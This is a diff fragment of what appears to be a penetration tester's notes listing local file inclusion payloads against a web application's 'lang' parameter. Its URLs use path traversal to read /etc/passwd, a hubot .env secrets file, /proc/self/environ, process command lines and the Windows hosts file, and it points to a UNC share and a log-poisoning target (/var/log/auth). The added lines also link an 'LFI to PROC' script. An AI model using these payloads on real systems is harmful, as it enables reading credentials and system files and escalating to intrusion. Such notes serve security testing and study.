@@ -151,9 +151,14 @@ http://web/dept/manage.php?notes=files/comments.txt
 http://web/dept/?lang=/windows/system32/drivers/etc/hosts 
 http://web/dept/?lang=\\192.168.162.46\hello.txt   
 http://web/dept/?lang=../../../../etc/passwd
+http://web/dept/?lang=../hubot/.env
+
+LFI to PROC Script
+https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html#bash-script
 http://web/dept/?lang=../../../../proc/self/cmdline
 http://web/dept/?lang=../../../../proc/self/environ
-http://web/dept/?lang=../hubot/.env
+http://web/dept/?lang=../../../../proc/955/cmdline
+
 
 Poison
 ../../../../../../var/log/auth
